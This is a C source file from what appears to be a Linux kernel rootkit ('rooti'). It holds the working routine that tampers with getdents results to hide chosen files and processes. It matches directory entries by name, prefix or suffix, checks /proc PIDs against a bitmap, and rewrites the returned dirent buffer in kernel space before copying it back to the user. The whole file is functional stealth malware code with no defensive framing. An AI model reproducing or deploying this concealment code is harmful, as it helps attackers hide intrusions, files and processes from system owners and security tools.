#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include "dentry.h"
#include "../../utils.h"
#include "../../config.h"

// Determines whether a file should be hidden by its full name
static bool rooti_should_hide_file_by_name(struct linux_dirent64 *record)
{
    for (int i = 0; i < ROOTI_HIDDEN_FILES_COUNT; i++) {
        if (strncmp(record->d_name, ROOTI_HIDDEN_FILES[i], NAME_MAX) == 0) {
            return true;
        }
    }
    return false;
}

// Determines whether a file should be hidden because its name starts with a prefix of hidden files
static bool rooti_should_hide_file_by_prefix(struct linux_dirent64 *record)
{
    size_t filename_len = strlen(record->d_name);
    size_t prefix_len = 0;
    
    for (int i = 0; i < ROOTI_HIDDEN_FILES_PREFIXES_COUNT; i++) {
        prefix_len = strlen(ROOTI_HIDDEN_FILES_PREFIXES[i]);
        if (filename_len >= prefix_len &&
            memcmp(record->d_name, ROOTI_HIDDEN_FILES_PREFIXES[i], prefix_len) == 0) {
            return true;
        }
    }
    return false;
}

// Determines whether a file should be hidden because its name ends with a suffix of hidden files
static bool rooti_should_hide_file_by_suffix(struct linux_dirent64 *record)
{
    size_t filename_len = strlen(record->d_name);
    size_t suffix_len = 0;

    for (int i = 0; i < ROOTI_HIDDEN_FILES_SUFFIXES_COUNT; i++) {
        suffix_len = strlen(ROOTI_HIDDEN_FILES_SUFFIXES[i]);
        if (filename_len >= suffix_len &&
            memcmp(record->d_name + filename_len - suffix_len, ROOTI_HIDDEN_FILES_SUFFIXES[i], suffix_len) == 0) {
            return true;
        }
    }
    return false;
}

// Determines whether the file entry qualifies to be hidden
static bool rooti_should_hide_file(struct linux_dirent64 *record)
{
    if (rooti_should_hide_file_by_name(record))
        return true;
    if (rooti_should_hide_file_by_prefix(record))
        return true;
    if (rooti_should_hide_file_by_suffix(record))
        return true;
    return false;
}

// Determines whether the process (file in /proc) qualifies to be hidden
static bool rooti_should_hide_proc(struct linux_dirent64 *record, unsigned char *pid_bitmap)
{    
    pid_t pid;

    // Try to convert the name of the file to a PID (if the file is even a PID file)
    int err = kstrtoint(record->d_name, 0, &pid);
    if (err) {
        return false;
    }

    // Check if the bit corresponding to the PID is set
    return (pid_bitmap[pid / 8] >> pid % 8) & 1U;
}

/*
    Conceals the dir entry from the results - either by increasing the size of the previous record
    to skip-over the hidden record, or if the record happens to be the first one in the buffer, shifts the
    entire buffer to override the entry, decreasing the size of the buffer accordingly.
    The updated size of the buffer is returned.
*/
static size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record, struct linux_dirent64 *prev_record, size_t count)
{
    // Special case where the record to hide is the first one
    if (prev_record == NULL) {
        // Shift the entire buffer to override the first record
        count -= curr_record->d_reclen;
        memmove(curr_record, (void *)curr_record + curr_record->d_reclen, count);
    } else {
        // Increase the size of previous record to override the current record
        prev_record->d_reclen += curr_record->d_reclen;
    }
    return count;
}

/*
    Filters out all entries that should be hidden from the results buffer.
    The updated size of the buffer is returned.
*/
static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_t count, bool is_proc_dir, unsigned char *pid_bitmap)
{
    struct linux_dirent64 *curr_record = NULL;
    struct linux_dirent64 *prev_record = NULL;
    unsigned long offset = 0;
    
    while (offset < count) {
        curr_record = (void *)records_buf + offset;
        // Check if the current record should be hidden
        if (rooti_should_hide_file(curr_record) || (is_proc_dir && rooti_should_hide_proc(curr_record, pid_bitmap))) {
            count = rooti_filter_dir_entry(curr_record, prev_record, count);
            if (curr_record == records_buf) {
                continue;
            }
        } else {
            prev_record = curr_record;
        }
        offset += curr_record->d_reclen;
    }
    return count;
}

/*
    Rigs the results of getdents by copying the results buffer into kernel space, filtering out any
    entries that should be hidden and copying the rigged results back to user space.
*/
size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir, unsigned char *pid_bitmap)
{
    // Allocate a kernel buffer to store the data returned to user
    struct linux_dirent64 *kernel_buf = kmalloc(count, GFP_KERNEL);
    if (kernel_buf == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return count;
    }

    // Copy the return data of the syscall to our kernel buffer
    int err = copy_from_user(kernel_buf, user_buf, count);
    if (err > 0) {
        ROOTI_DEBUG("copy_from_user() failed: %d", err);
        kfree(kernel_buf);
        return count;
    }

    // Tamper with the returned records, concealing any files we wish to hide 
    count = rooti_filter_dir_entries(kernel_buf, count, is_proc_dir, pid_bitmap);

    // Copy the rigged buffer back to userspace
    err = copy_to_user(user_buf, kernel_buf, count);
    if (err > 0) {
        ROOTI_DEBUG("copy_to_user() failed: %d", err);
    }

    kfree(kernel_buf);
    return count;
}